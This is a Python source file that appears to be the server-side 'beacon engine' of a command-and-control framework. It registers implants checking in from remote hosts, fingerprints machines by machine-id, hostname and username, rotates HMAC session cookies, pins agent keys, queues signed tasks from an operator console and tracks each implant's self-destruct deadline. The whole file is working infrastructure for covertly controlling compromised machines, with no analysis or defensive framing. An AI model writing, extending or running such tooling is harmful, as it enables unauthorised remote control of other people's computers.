"""Beacon engine — session registry and task dispatcher.

This is the single source of truth for beacon state. The listener reads
and writes through it; the console reads through it. All mutation is
serialized under one lock so the engine can be called from the HTTP
listener thread and the operator console simultaneously.
"""

from __future__ import annotations

import hashlib
import threading
import time
from typing import Dict, List, Optional

from . import constants
from .protocol import Result, Task
from .session import BeaconSession


def _fingerprint(identity: dict) -> str:
    """Stable fingerprint over the fields that survive reimaging.

    Machine-id alone is not enough — the Windows MachineGuid and Linux
    /etc/machine-id are stable across reboots but not across some
    imaging operations. Including hostname and username makes the
    fingerprint resilient while still unique.
    """
    h = hashlib.sha256()
    for key in ('machine_id', 'hostname', 'username', 'os'):
        h.update(str(identity.get(key, '')).encode('utf-8', 'replace'))
        h.update(b'\x00')
    return h.hexdigest()[:32]


class BeaconEngine:
    """Central coordinator for all beacon sessions."""

    def __init__(self, handler):
        self.handler = handler
        self.sessions: Dict[int, BeaconSession] = {}
        self._by_fingerprint: Dict[str, int] = {}
        self._lock = threading.RLock()
        # Offset so beacon IDs never collide with shell session IDs in
        # the shared registry. The counter is monotonic and independent
        # of the shell handler's client_counter.
        self._counter = 1000
        # Transient handoff from enqueue() to the console. Entries are
        # popped by take_waiter() on the console thread immediately
        # after enqueue returns.
        self._waiter_handoff: Dict[str, object] = {}

        # Task signing — reuses the handler's per-run ECDSA signer.
        try:
            from .crypto import TaskSigner
            self.signer = TaskSigner(handler.signer)
        except Exception:
            self.signer = None

        # Background sweep: forget beacons that have been silent for
        # far longer than their TTL. Prevents the session list from
        # growing without bound on a long-running handler.
        self._reaper = threading.Thread(
            target=self._expire_loop, daemon=True,
        )
        self._reaper.start()

        # Cookie signing key. Fresh per process run; cookies issued
        # by a previous handler instance do not verify against a new
        # one, which is the desired behaviour (a restart forces every
        # beacon to re-check-in and receive a new cookie).
        import secrets as _secrets
        self._cookie_key = _secrets.token_bytes(32)

        # Index from cookie string to session id. Populated when a
        # cookie is issued; consulted on every /tasks and /results
        # request. Rebuilt from scratch when the handler restarts.
        self._by_cookie: Dict[str, int] = {}

    # ------------------------------------------------------------------
    # Cookie issue / verify

    def issue_cookie(self, session_id: int) -> str:
        """Return a fresh cookie for `session_id` and record the
        mapping. Called at the end of every successful check-in, so
        the cookie rotates on each check-in the way real session
        cookies do."""
        import base64 as _b64
        import hmac as _hmac
        import hashlib as _hashlib
        import secrets as _secrets

        nonce = _secrets.token_bytes(16)
        mac = _hmac.new(self._cookie_key, nonce, _hashlib.sha256).digest()
        cookie = (
            _b64.urlsafe_b64encode(nonce).rstrip(b'=').decode('ascii')
            + '.'
            + _b64.urlsafe_b64encode(mac).rstrip(b'=').decode('ascii')
        )
        with self._lock:
            sess = self.sessions.get(session_id)
            # Retire the previous cookie before publishing the new one.
            # Only the most recent cookie for a session is valid — this
            # matches browser session behaviour and bounds the size of
            # the cookie index to one entry per live session.
            if sess is not None and sess.cookie:
                self._by_cookie.pop(sess.cookie, None)
            self._by_cookie[cookie] = session_id
            if sess is not None:
                sess.cookie = cookie
        return cookie

    def verify_cookie(self, cookie: str) -> Optional[int]:
        """Return the session id for `cookie`, or None if the cookie
        is missing, malformed, has a bad MAC, or refers to a session
        the engine no longer tracks."""
        import base64 as _b64
        import hmac as _hmac
        import hashlib as _hashlib

        if not cookie or '.' not in cookie:
            return None
        try:
            nonce_b64, mac_b64 = cookie.split('.', 1)
            pad = lambda s: s + '=' * (-len(s) % 4)
            nonce = _b64.urlsafe_b64decode(pad(nonce_b64))
            mac = _b64.urlsafe_b64decode(pad(mac_b64))
        except Exception:
            return None

        expected = _hmac.new(
            self._cookie_key, nonce, _hashlib.sha256).digest()
        try:
            if not _hmac.compare_digest(expected, mac):
                return None
        except Exception:
            return None

        with self._lock:
            sid = self._by_cookie.get(cookie)
            if sid is None:
                return None
            if sid not in self.sessions:
                return None
        return sid


    def _expire_loop(self) -> None:
        """Every 5 minutes, forget beacons that have gone permanently
        silent. A beacon is considered permanently lost after
        EXPIRE_AFTER * BEACON_TTL_FACTOR missed check-ins.
        """
        EXPIRE_MULTIPLIER = 100  # beacons go silent 100x the normal TTL
        while True:
            time.sleep(300)
            try:
                now = time.time()
                to_forget = []
                with self._lock:
                    for sid, s in self.sessions.items():
                        ttl = max(s.sleep_interval * constants.BEACON_TTL_FACTOR, 60)
                        if (now - s.last_seen) > ttl * EXPIRE_MULTIPLIER:
                            to_forget.append(sid)
                for sid in to_forget:
                    self.forget(sid)
            except Exception:
                pass

    # ------------------------------------------------------------------
    # Lookup

    def get(self, session_id: int) -> Optional[BeaconSession]:
        with self._lock:
            return self.sessions.get(session_id)

    def list_all(self) -> List[BeaconSession]:
        with self._lock:
            return list(self.sessions.values())

    def list_alive(self) -> List[BeaconSession]:
        with self._lock:
            return [s for s in self.sessions.values() if s.alive]

    # ------------------------------------------------------------------
    # Check-in

    def handle_checkin(self, data: dict) -> dict:
        identity = data.get('identity') or {}
        fp = _fingerprint(identity)
        pubkey_pem = data.get('agent_pubkey') or ''

        with self._lock:
            session = self._lookup_or_create(fp, identity)

            # Trust-on-first-use: pin the agent's public key the first
            # time it is presented. A later check-in carrying a
            # different key for the same fingerprint is refused
            # outright — the session is not touched and the caller
            # returns 403. This check must run before last_seen /
            # checkins are updated, otherwise a rejected check-in
            # still refreshes the session's liveness.
            if pubkey_pem:
                presented = self._parse_pubkey(pubkey_pem)
                if session.agent_pubkey is None:
                    session.agent_pubkey = presented
                elif (presented is not None and
                      session.agent_pubkey is not None and
                      presented.public_numbers() !=
                          session.agent_pubkey.public_numbers()):
                    if session.logger:
                        try:
                            session.logger.log_event(
                                "REJECTED: beacon check-in with "
                                "mismatched public key")
                        except Exception:
                            pass
                    return None

            session.last_addr = data.get('addr')
            session.last_seen = time.time()
            session.checkins += 1
            first_checkin = (session.checkins == 1)

        cookie = self.issue_cookie(session.id)

        # Surface the new session to the operator console. Without
        # this, the check-in succeeds silently and the operator has no
        # cue to run `beacons` — the beacon subsystem looks inert even
        # though it is working. Printed outside the lock so a slow
        # console write does not stall the listener thread.
        if first_checkin:
            try:
                c = getattr(self.handler, 'colors', {})
                os_name = session.identity.get('os', '?')
                arch = session.identity.get('arch', '?')
                print(
                    f"{c.get('green','')}[BEACON] New beacon "
                    f"#{session.id}: {session.display_name} "
                    f"({os_name}/{arch}) | beacon {session.id}"
                    f"{c.get('end','')}"
                )
            except Exception:
                pass

        return {
            'id':            session.id,
            'sleep':         session.sleep_interval,
            'jitter':        session.jitter,
            'kill_deadline': session.kill_deadline,
            'proto':         constants.PROTO_VERSION,
            # Cookie transport. Same value is delivered in the
            # Set-Cookie header so a client that prefers cookies over
            # response body fields can use either. The agent reads the
            # body field; the header exists for future compatibility
            # with HTTP clients that manage cookies automatically.
            'cookie':        cookie,
        }


    def _lookup_or_create(self, fp: str, identity: dict) -> BeaconSession:
        existing = self._by_fingerprint.get(fp)
        if existing is not None:
            session = self.sessions.get(existing)
            if session is not None:
                session.last_seen = time.time()
                self._touch_registry(session)
                return session
            # Fingerprint → ID reservation survived a `forget`. The
            # session object was removed but the ID reservation was
            # kept, so a reconnecting beacon reclaims its original
            # identifier instead of getting a fresh one from the
            # counter. The counter is NOT incremented: the reservation
            # already consumed its slot when the session was first
            # created.
            session = BeaconSession(existing, identity, fp)
        else:
            self._counter += 1
            session = BeaconSession(self._counter, identity, fp)
            self._by_fingerprint[fp] = session.id
        # Prefer the agent's own build-time kill-days value (sent in
        # the check-in identity as `kill_days`) over the server
        # constant. The agent enforces its own deadline regardless of
        # what the server says, so echoing a different value back only
        # creates confusion. Fall back to the server default only
        # when the field is genuinely absent (an older agent that
        # does not send it).
        #
        # `identity.get('kill_days') or DEFAULT` is wrong here: 0 is
        # a legitimate value meaning "no self-destruct", and `0 or 30`
        # would silently upgrade it to a 30-day deadline.
        kd = identity.get('kill_days')
        if kd is None:
            kill_days = constants.DEFAULT_KILL_DAYS
        else:
            try:
                kill_days = int(kd)
            except (TypeError, ValueError):
                kill_days = constants.DEFAULT_KILL_DAYS
        # kill_days <= 0 → no self-destruct. Store 0 so the listener
        # omits the X-Beacon-Kill header entirely; otherwise the
        # agent would receive a deadline of "now" and exit on the
        # next loop iteration.
        if kill_days <= 0:
            session.kill_deadline = 0.0
        else:
            session.kill_deadline = time.time() + kill_days * 86400
        self.sessions[session.id] = session
        # self._by_fingerprint[fp] is already correct for both
        # branches: it was set inside the `else` branch when a new
        # reservation was allocated, and it still holds the reservation
        # ID when the session was recreated after a forget.

        # Give the beacon its own session log directory, using the
        # same naming convention as the shell handler. Keeps
        # `if session.logger:` blocks throughout this module honest.
        try:
            from ..session_log import SessionLogger
            user = identity.get('username', 'unknown') or 'unknown'
            host = identity.get('hostname', 'unknown') or 'unknown'
            ip   = session.last_addr or '0.0.0.0'
            sid  = f"b{session.id:03d}_{user}@{host}_{ip}_beacon"
            session.logger = SessionLogger(sid)
            session.logger.log_event(
                f"Beacon check-in from {ip} "
                f"({identity.get('os','?')}/{identity.get('arch','?')})"
            )
        except Exception:
            session.logger = None

        # Register with the shell handler's session registry so
        # `sessions` and `reconnects` display beacons too.
        self._touch_registry(session)
        return session

    def _touch_registry(self, session: BeaconSession) -> None:
        """Push beacon state into the shared registry. Failure here is
        never fatal — the beacon engine keeps its own copy of the data
        regardless of whether the registry accepts it."""
        try:
            registry = self.handler.registry
            info = {
                'kind':        'beacon',
                'id':          session.id,
                'fingerprint': session.fingerprint,
                'type':        session.identity.get('os', 'unknown'),
                'addr':        (session.last_addr or '0.0.0.0', 0),
                'direction':   'beacon',
                'sysinfo':     dict(session.identity),
                'identity':    dict(session.identity),
                'connect_count': session.checkins,
            }
            registry.register_active(info, session.fingerprint, '')
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Task dispatch
    def enqueue(self, session_id: int, verb: str,
                args: Optional[List[str]] = None,
                timeout: int = 60,
                track: bool = True) -> Optional[str]:
        """Queue a task for a session.

        `track` controls whether the waiter is stashed in
        `_waiter_handoff` for the console's async delivery path. Set
        it to False when the caller will wait on the result itself
        via `session.await_result`, otherwise the handoff entry is
        never consumed and the map grows unbounded.
        """
        session = self.get(session_id)
        if session is None:
            return None
        sign = None
        if self.signer is not None and self.signer.enabled:
            sign = self.signer.sign_task
        result = session.enqueue(verb, args, timeout, sign=sign)
        if result is None:
            return None
        task_id, waiter = result
        if track:
            # Only stash for the console's take_waiter path. Direct
            # waiters (upload, kill) get the waiter from
            # session.pending via session.await_result and must not
            # leave a stale handoff entry behind.
            with self._lock:
                self._waiter_handoff[task_id] = waiter
        return task_id

    def take_waiter(self, task_id: str):
        """Pop the waiter for `task_id`, or None if the result
        already arrived. Called by the console immediately after
        enqueue."""
        with self._lock:
            return self._waiter_handoff.pop(task_id, None)

    def pop_tasks(self, session_id: int,
                  max_batch: int = constants.TASK_BATCH_MAX) -> List[Task]:
        session = self.get(session_id)
        if session is None:
            return []

        # A poll is a liveness signal. The agent only does the initial
        # check-in once; every subsequent heartbeat is a GET /tasks.
        # Without this touch, the server declares a healthy beacon dead
        # after sleep * BEACON_TTL_FACTOR seconds.
        session.last_seen = time.time()
        # Record the interval the agent just picked up. This is what
        # `alive` uses for the grace window, so a console-side change
        # to `sleep` does not shrink the window until the agent has
        # actually acknowledged it by polling.
        session._confirmed_sleep = session.sleep_interval

        tasks: List[Task] = []
        for _ in range(max_batch):
            t = session.pop_task()
            if t is None:
                break
            tasks.append(t)
        return tasks

    def await_result(self, session_id: int, task_id: str,
                     timeout: float = constants.TASK_TIMEOUT):
        session = self.get(session_id)
        if session is None:
            return None
        return session.await_result(task_id, timeout=timeout)

    # ------------------------------------------------------------------
    # Result delivery

    def store_result(self, session_id: int, wire: dict) -> None:
        session = self.get(session_id)
        if session is None:
            return
        try:
            result = Result.from_wire(wire)
        except Exception:
            return

        # Verify the agent's signature if a public key was pinned at
        # check-in. Sessions without a pinned key accept unsigned
        # results (the agent was built without AgentPrivKeyPem).
        if session.agent_pubkey is not None:
            if not self._verify_result_signature(session, result):
                with self._lock:
                    session.rejected_results += 1
                # Surface to the operator console — a signature
                # rejection is an operational signal, not just a log
                # entry. If the console is not attached this is a no-op.
                c = getattr(self.handler, 'colors', {})
                try:
                    print(
                        f"{c.get('red','')}[BEACON] Signature verification "
                        f"failed on result for task {result.id} "
                        f"(session #{session.id}, "
                        f"total rejected: {session.rejected_results})"
                        f"{c.get('end','')}"
                    )
                except Exception:
                    pass
                if session.logger:
                    try:
                        session.logger.log_event(
                            f"rejected unsigned/forged result for "
                            f"task {result.id}")
                    except Exception:
                        pass
                return

        session.deliver_result(result)

    def _verify_result_signature(self, session, result) -> bool:
        try:
            from cryptography.hazmat.primitives.asymmetric import ec
            from cryptography.hazmat.primitives import hashes
            import base64 as _b64

            sig = _b64.b64decode(result.signature)
            payload = result.signable()
            session.agent_pubkey.verify(
                sig, payload, ec.ECDSA(hashes.SHA256()))
            return True
        except Exception:
            return False

    # ------------------------------------------------------------------
    # Lifecycle

    def forget(self, session_id: int) -> None:
        with self._lock:
            session = self.sessions.pop(session_id, None)
            if session is not None:
                # Drop every cookie issued for this session. A stale
                # cookie must not resurrect a forgotten session.
                stale = [
                    c for c, sid in self._by_cookie.items()
                    if sid == session_id
                ]
                for c in stale:
                    self._by_cookie.pop(c, None)
                # NOTE: self._by_fingerprint[session.fingerprint] is
                # intentionally left in place. Keeping the reservation
                # means a beacon reconnecting from the same physical
                # machine reclaims its original ID instead of being
                # assigned a new one from the counter. Operators who
                # want a machine to be issued a genuinely new ID
                # restart the handler, which clears every reservation.


    @staticmethod
    def _parse_pubkey(pem_str: str):
        try:
            from cryptography.hazmat.primitives import serialization
            return serialization.load_pem_public_key(
                pem_str.encode('utf-8'))
        except Exception:
            return None